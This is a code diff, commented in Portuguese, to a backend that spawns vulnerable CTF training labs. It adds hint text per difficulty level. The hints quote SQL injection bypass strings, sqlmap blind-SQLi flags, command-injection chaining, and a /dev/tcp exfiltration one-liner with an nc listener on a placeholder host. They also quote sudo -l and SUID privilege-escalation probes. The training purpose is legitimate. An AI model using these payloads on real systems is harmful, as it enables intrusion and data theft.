@@ -54,6 +54,103 @@ class SpawnAccepted(BaseModel):
     status: str = "pending"
 
 
+# Dica determinística por (tipo, variante, dificuldade) — cada nível
+# exige uma TÉCNICA de exploração genuinamente diferente, então a dica
+# precisa apontar a técnica certa, não a mesma coisa reciclada.
+_PHASE1_HINTS: dict[tuple[str, str, str], str] = {
+    ("sqli", "login_bypass", "easy"): (
+        "Fase 1: o login (procura o link certo no site) é vulnerável a "
+        "SQL Injection, com erro de sintaxe visível — contorna a "
+        "autenticação (ex: admin' -- ) pra achar a primeira flag."
+    ),
+    ("sqli", "login_bypass", "medium"): (
+        "Fase 1: o login é vulnerável a SQL Injection, mas sem mensagem "
+        "de erro na tela — não confia só no que a página mostra, testa "
+        "payloads de bypass e extração via UNION mesmo sem essa pista."
+    ),
+    ("sqli", "login_bypass", "hard"): (
+        "Fase 1: o login é vulnerável, mas TOTALMENTE CEGO — só diz "
+        "'permitido' ou 'negado', nunca mostra dado nenhum. Isso é blind "
+        "SQLi de verdade; o caminho realista é `sqlmap` com "
+        "`--technique=B` (boolean-based), não tentativa manual."
+    ),
+    ("sqli", "search_exfiltration", "easy"): (
+        "A busca de produtos usa o texto digitado direto numa query "
+        "SQL, com erro de sintaxe visível — tenta uma injeção UNION pra "
+        "puxar dados de outra tabela através dos resultados da busca."
+    ),
+    ("sqli", "search_exfiltration", "medium"): (
+        "A busca de produtos é vulnerável a SQL Injection, mas sem "
+        "mensagem de erro — o UNION ainda funciona e mostra dado, só "
+        "não tem a pista da sintaxe pra te guiar."
+    ),
+    ("sqli", "search_exfiltration", "hard"): (
+        "A busca é vulnerável, mas só diz 'encontrado(s)' ou 'nenhum "
+        "resultado' — nunca mostra dado. Blind SQLi booleano; "
+        "`sqlmap --technique=B` é o caminho realista aqui."
+    ),
+    ("command_injection", "network_tool", "easy"): (
+        "Fase 1: o campo de host vai direto pro comando de sistema, com "
+        "a saída sempre visível — encadeia outro comando junto do ping "
+        "(ex: usando ; ou &&) pra ler a primeira flag."
+    ),
+    ("command_injection", "network_tool", "medium"): (
+        "Fase 1: o campo de host é vulnerável, mas a saída do comando "
+        "nunca aparece na tela — o único sinal é o TEMPO de resposta. "
+        "Testa algo como `; sleep 5` e observa se a resposta demora mais."
+    ),
+    ("command_injection", "network_tool", "hard"): (
+        "Fase 1: o comando roda em segundo plano — nem saída, nem tempo "
+        "de resposta servem de sinal. Só resta exfiltração fora de "
+        "banda: deixa um `nc -lvnp PORTA` escutando no atacante, e "
+        "injeta algo como `bash -c 'cat /opt/flag.txt > /dev/tcp/"
+        "SEU_HOST/PORTA'` pra mandar a flag de volta."
+    ),
+    ("command_injection", "log_viewer", "easy"): (
+        "Fase 1: o campo de arquivo vai direto pro comando de sistema "
+        "via parâmetro da URL (GET), com a saída sempre visível — "
+        "encadeia outro comando junto do nome do log pra ler a primeira "
+        "flag."
+    ),
+    ("command_injection", "log_viewer", "medium"): (
+        "Fase 1: o parâmetro de log é vulnerável, mas o conteúdo nunca "
+        "aparece — só o TEMPO de resposta é um sinal confiável. Testa "
+        "encadear `; sleep 5` no valor do parâmetro."
+    ),
+    ("command_injection", "log_viewer", "hard"): (
+        "Fase 1: a consulta roda em segundo plano — nem conteúdo, nem "
+        "tempo servem de sinal. Só resta exfiltração fora de banda: "
+        "`nc -lvnp PORTA` escutando no atacante, e injeta algo como "
+        "`bash -c 'cat /opt/flag.txt > /dev/tcp/SEU_HOST/PORTA'`."
+    ),
+}
+
+_PHASE2_HINTS: dict[str, str] = {
+    "login_bypass": (
+        " Fase 2: a senha que você descobrir também abre uma sessão "
+        "SSH — de lá, um `sudo -l` mostra o que dá pra rodar como root "
+        "sem senha."
+    ),
+    "network_tool": (
+        " Fase 2: você já tem execução de código como www-data — testa "
+        "`sudo -l` na própria injeção pra ver o que dá pra executar "
+        "como root sem senha, e usa isso pra ler a segunda flag numa "
+        "única injeção."
+    ),
+    "log_viewer": (
+        " Fase 2: procura por binários com bit SUID mal configurado "
+        "(ex: injeta `find / -perm -4000 2>/dev/null`), e usa o que "
+        "encontrar pra ler a segunda flag numa única injeção."
+    ),
+}
+
+
+def _build_extra_hint(vulnerability_type: str, variant: str, difficulty: str) -> str:
+    phase1 = _PHASE1_HINTS.get((vulnerability_type, variant, difficulty), "")
+    phase2 = _PHASE2_HINTS.get(variant, "")
+    return phase1 + phase2
+
+
 async def _run_setup_job(
     job_id: str,
     instance_id: str,
@@ -67,7 +164,7 @@ async def _run_setup_job(
     para uma thread via asyncio.to_thread. Fluxo em 3 fases:
       1. infraestrutura (apt-get, mysql se aplicável) — determinístico
       2. injeção dos arquivos da aplicação via write_file (put_archive,
-         sem shell) — pode ser mais de um arquivo (site com várias páginas)
+         sem shell)
       3. seed/permissões + start do Apache + fase 2 (privesc, se houver)
     """
     await update_job_async(job_id, status="running")
@@ -78,8 +175,6 @@ async def _run_setup_job(
             orchestrator.run_setup_commands, instance_id, pre_app_commands, "target"
         )
 
-        # Proteção extra: garante que o diretório existe antes de tentar
-        # escrever os arquivos.
         await asyncio.to_thread(
             orchestrator.run_setup_commands, instance_id, ["mkdir -p /var/www/html"], "target"
         )
@@ -126,15 +221,11 @@ async def generate_and_spawn(
     current_username: str = Depends(get_current_username),
 ) -> SpawnAccepted:
     """
-    O agente (LangChain, múltiplas etapas) classifica o tipo de
-    vulnerabilidade E a VARIANTE de template pedidos, busca exemplos
-    validados (RAG vetorial), rascunha nome/dificuldade/dicas e se
+    O agente classifica tipo + VARIANTE + DIFICULDADE — as três decisões
+    técnicas de verdade (templates determinísticos diferentes), busca
+    exemplos validados (RAG vetorial), rascunha nome/dicas e se
     autocritica. A infraestrutura e o código da aplicação vulnerável em
-    si são SEMPRE determinísticos por (tipo, variante).
-
-    Variantes de sqli:
-      - login_bypass: 2 fases (bypass de login + privesc SSH/sudo)
-      - search_exfiltration: 1 fase (SQLi via busca GET, sem privesc)
+    si são SEMPRE determinísticos por (tipo, variante, dificuldade).
     """
     user = await get_user_by_username(current_username)
     user_id = user.id if user else None
@@ -142,6 +233,7 @@ async def generate_and_spawn(
     agent_result = await generate_scenario_with_agent(req.description)
     vulnerability_type = agent_result["vulnerability_type"]
     variant = agent_result["variant"]
+    difficulty = agent_result["difficulty"]
 
     job_id = str(uuid.uuid4())[:8]
     scenario_id = str(uuid.uuid4())
@@ -155,18 +247,9 @@ async def generate_and_spawn(
         root_flag_hash = hashlib.sha256(root_flag_value.encode()).hexdigest()
 
         pre_app_commands = build_log_viewer_pre_app_commands()
-        app_files = {"/var/www/html/index.php": build_log_viewer_php()}
+        app_files = {"/var/www/html/index.php": build_log_viewer_php(difficulty)}
         post_app_commands = build_log_viewer_post_app_commands(
             flag_value, flag_location, root_flag_value
-        )
-        extra_hint = (
-            "Fase 1: o campo de arquivo vai direto pro comando de "
-            "sistema via parâmetro da URL (GET), sem sanitização — "
-            "encadeia outro comando junto do nome do log (ex: usando ; "
-            "ou &&) pra ler a primeira flag. Fase 2: procura por "
-            "binários com bit SUID mal configurado (ex: injeta `find / "
-            "-perm -4000 2>/dev/null`), e usa o que encontrar pra ler a "
-            "segunda flag numa única injeção."
         )
 
     elif vulnerability_type == "command_injection":
@@ -175,23 +258,9 @@ async def generate_and_spawn(
         root_flag_hash = hashlib.sha256(root_flag_value.encode()).hexdigest()
 
         pre_app_commands = build_command_injection_pre_app_commands()
-        app_files = {"/var/www/html/index.php": build_command_injection_php()}
+        app_files = {"/var/www/html/index.php": build_command_injection_php(difficulty)}
         post_app_commands = build_command_injection_post_app_commands(
             flag_value, flag_location, root_flag_value
-        )
-        extra_hint = (
-            "Fase 1: o campo de host vai direto pro comando de sistema, "
-            "sem sanitização — encadeia outro comando junto do ping (ex: "
-            "usando ; ou &&) pra ler a primeira flag. Fase 2: você já tem "
-            "execução de código como www-data — testa `sudo -l` na "
-            "própria injeção (ex: ; sudo -l) pra ver o que dá pra "
-            "executar como root sem senha, e usa isso pra ler a segunda "
-            "flag numa única injeção. (Alternativa mais realista, se "
-            "quiser: abrir uma reverse shell de volta pro seu atacante "
-            "com um `nc -lvnp PORTA` esperando do lado atacante — mas "
-            "lembra que a conexão do terminal pode cair e reiniciar a "
-            "sessão nesse meio-tempo, então o caminho direto é mais "
-            "confiável.)"
         )
 
     elif variant == "search_exfiltration":
@@ -200,14 +269,9 @@ async def generate_and_spawn(
         pre_app_commands = build_search_pre_app_commands(db_password)
         app_files = {
             "/var/www/html/index.php": build_search_landing_php(),
-            "/var/www/html/search.php": build_search_php(db_password),
+            "/var/www/html/search.php": build_search_php(db_password, difficulty),
         }
         post_app_commands = build_search_post_app_commands(flag_value, flag_location)
-        extra_hint = (
-            "A busca de produtos usa o texto digitado direto numa query "
-            "SQL, sem sanitização — tenta uma injeção UNION pra puxar "
-            "dados de outra tabela através dos resultados da busca."
-        )
 
     else:  # login_bypass (padrão)
         flag_location = "/root/flag.txt"
@@ -221,25 +285,20 @@ async def generate_and_spawn(
         app_files = {
             "/var/www/html/index.php": build_landing_php(),
             "/var/www/html/about.php": build_about_php(),
-            "/var/www/html/login.php": build_login_php(db_password),
+            "/var/www/html/login.php": build_login_php(db_password, difficulty),
             "/var/www/html/robots.txt": build_robots_txt(),
         }
         post_app_commands = build_sqli_post_app_commands(
             admin_password, flag_value, flag_location, webadmin_password, root_flag_value
         )
-        extra_hint = (
-            "Fase 1: o login (procura o link certo no site) é vulnerável a "
-            "SQL Injection — contorna a autenticação pra achar a primeira "
-            "flag. Fase 2: a senha que você descobrir também abre uma "
-            "sessão SSH — de lá, um `sudo -l` mostra o que dá pra rodar "
-            "como root sem senha."
-        )
+
+    extra_hint = _build_extra_hint(vulnerability_type, variant, difficulty)
 
     spec = ScenarioSpec(
         name=agent_result["name"],
         base_image="ubuntu:22.04",
         vulnerability_type=vulnerability_type,
-        difficulty=agent_result["difficulty"],
+        difficulty=difficulty,
         setup_commands=pre_app_commands + list(app_files.keys()) + post_app_commands,
         flag_location=flag_location,
         hints=list(agent_result["hints"]) + [extra_hint],
